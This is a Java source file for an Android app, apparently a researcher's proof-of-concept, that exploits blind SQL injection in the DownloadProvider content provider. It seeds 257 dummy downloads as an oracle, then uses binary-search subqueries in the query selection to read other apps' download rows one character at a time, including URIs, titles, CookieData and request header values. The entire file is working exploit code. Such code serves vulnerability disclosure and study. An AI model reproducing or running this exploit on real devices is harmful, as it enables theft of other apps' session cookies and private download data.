package com.ioactive.downloadProviderDbDumperSQLiWhere;

import android.app.DownloadManager;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Process;
import android.support.v7.app.AppCompatActivity;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.TextView;

public class MainActivity extends AppCompatActivity {
    // Adjustable priority for the "dump info" thread (-20 = maximum priority)
    private static final int THREAD_PRIORITY = -20;

    private static final String TAG = "DwnPrvDbDumperWhere";
    private static final String LOG_SEPARATOR = "\n**********************************\n";

    private static final String MY_DOWNLOADS_URI = "content://downloads/my_downloads/";
    //private static final String MY_DOWNLOADS_URI = "content://downloads/download/"; // Works as well

    private TextView mTextViewLog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mTextViewLog = findViewById(R.id.textViewLog);
        mTextViewLog.setMovementMethod(new ScrollingMovementMethod());
    }

    private synchronized void log(final String text) {
        Log.d(TAG, text);

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                mTextViewLog.append(text + "\n");
            }
        });
    }

    public void buttonDump_Click(View view) {
        findViewById(R.id.buttonDump).setEnabled(false);

        new Thread(new Runnable() {
            public void run() {
                android.os.Process.setThreadPriority(THREAD_PRIORITY);

                try {
                    dumpAll();
                } catch (Exception e) {
                    Log.e(TAG, "Error", e);
                    log(e.toString());
                } finally {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            findViewById(R.id.buttonDump).setEnabled(true);
                        }
                    });
                }
            }
        }).start();
    }

    private void dumpAll() {
        ensureAccessibleRows();

        log("EXTRACTING DATA...");

        int myUid = Process.myUid();
        int downloadId = Integer.MAX_VALUE;
        do {
            downloadId = binarySearch(String.format("(SELECT MAX(_id) FROM downloads WHERE uid <> %s AND _id < %s)", myUid, downloadId), 20000);

            if (downloadId >= 0) {
                log(LOG_SEPARATOR + "DOWNLOAD ID: " + downloadId);

                log(dumpDownloadsTextColumn(downloadId, "_Data"));
                log(dumpDownloadsTextColumn(downloadId, "URI"));
                log(dumpDownloadsTextColumn(downloadId, "Title"));
                log(dumpDownloadsTextColumn(downloadId, "Description"));
                log(dumpDownloadsTextColumn(downloadId, "UID"));
                log(dumpDownloadsTextColumn(downloadId, "CookieData"));
                log(dumpDownloadsTextColumn(downloadId, "ETag"));

                dumpHeaders(downloadId);
            }
        } while (downloadId > 0);

        log("\n\nDUMP FINISHED");
    }

    private void ensureAccessibleRows() {
        Cursor cur = null;
        try {
            ContentResolver res = getContentResolver();
            Uri uri = Uri.parse(MY_DOWNLOADS_URI);

            //res.delete(uri, null, null); // Cleanup for testing

            cur = res.query(uri, new String[]{"title"}, null, null, null);
            if (cur == null || cur.getCount() != 257) {
                log("Initializing. PLEASE WAIT...\n");
                res.delete(uri, null, null);
                insertNewDownloads();
            }
        } finally {
            if (cur != null)
                cur.close();
        }
    }

    private void insertNewDownloads() {
        ContentResolver res = this.getContentResolver();
        Uri uri = Uri.parse(MY_DOWNLOADS_URI);
        String cacheDir = getCacheDir().getAbsolutePath();

        for (int i = 0; i <= 256; i++) {
            ContentValues cv = new ContentValues();
            cv.put("is_public_api", true);
            cv.put("destination", 2); // DESTINATION_CACHE_PARTITION_PURGEABLE
            cv.put("visibility", DownloadManager.Request.VISIBILITY_VISIBLE);
            cv.put("hint", "file://" + cacheDir + "/dummy" + i);
            cv.put("uri", "http://www.example.com/");
            cv.put("title", i);

            try {
                res.insert(uri, cv);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void dumpHeaders(int downloadId) {
        int headerId = -1;
        do {
            headerId = binarySearch(String.format("(SELECT MIN(id) FROM request_headers WHERE download_id = %s AND id > %s)", downloadId, headerId), 1000);
            if (headerId > 0) {
                log("\nHEADER ID: " + headerId);
                log(dumpHeadersTextColumn(headerId, "Header"));
                log(dumpHeadersTextColumn(headerId, "Value"));
            }
        } while (headerId > 0);
    }

    private String dumpHeadersTextColumn(int rowId, String columnName) {
        return dumpTextColumn("id", rowId, "request_headers", columnName);
    }

    private String dumpDownloadsTextColumn(int rowId, String columnName) {
        return dumpTextColumn("_id", rowId, "downloads", columnName);
    }

    private String dumpTextColumn(String columnId, int rowId, String tableName, String columnName) {
        StringBuilder sb = new StringBuilder();
        String condition = String.format("(SELECT length(%s) FROM %s WHERE (%s=%s))", columnName, tableName, columnId, rowId);
        if (isTrueCondition(condition + " > 0")) {
            int len = extractNumber(condition);

            sb.append("\n").append(columnName).append(": ");
            for (int i = 1; i <= len; i++) {
                int c = extractNumber(String.format("(SELECT unicode(substr(%s,%s,1)) FROM %s WHERE (%s=%s))", columnName, i, tableName, columnId, rowId));
                String newChar = Character.toString((char) c);
                sb.append(newChar);
            }
        }
        return sb.toString();
    }

    private int binarySearch(String sqlExpression, int max) {
        int min = 0;
        int mid = 0;

        while (min + 1 < max) {
            mid = (int) Math.floor((double) (max + min) / 2);

            if (isTrueCondition(sqlExpression + ">" + mid))
                min = mid;
            else
                max = mid;
        }

        if ((mid == max) && isTrueCondition(sqlExpression + "=" + mid))
            return mid;
        else if (isTrueCondition(sqlExpression + "=" + (mid + 1))) // Extra check
            return mid + 1;

        return -1;
    }

    private int extractNumber(String sqlExpression) {
        int n = extractByte(sqlExpression);
        if (n < 0)
            return binarySearch(sqlExpression, 65536);
        else
            return n;
    }

    private int extractByte(String sqlExpression) {
        ContentResolver res = getContentResolver();
        Uri uri = Uri.parse(MY_DOWNLOADS_URI);

        String injection = "title = (" + sqlExpression + ")";
        Cursor cur = res.query(uri, new String[]{"title"}, injection, null, null);

        try {
            if (cur != null && cur.getCount() == 1) {
                cur.moveToFirst();
                return cur.getInt(0);
            } else {
                return -1;
            }
        } finally {
            if (cur != null)
                cur.close();
        }
    }

    private boolean isTrueCondition(String sqlCondition) {
        ContentResolver res = getContentResolver();
        Uri uri = Uri.parse(MY_DOWNLOADS_URI);
        Cursor cur = res.query(uri, new String[]{"_id"}, sqlCondition, null, null);

        try {
            return (cur != null && cur.getCount() > 0);
        } finally {
            if (cur != null)
                cur.close();
        }
    }

}
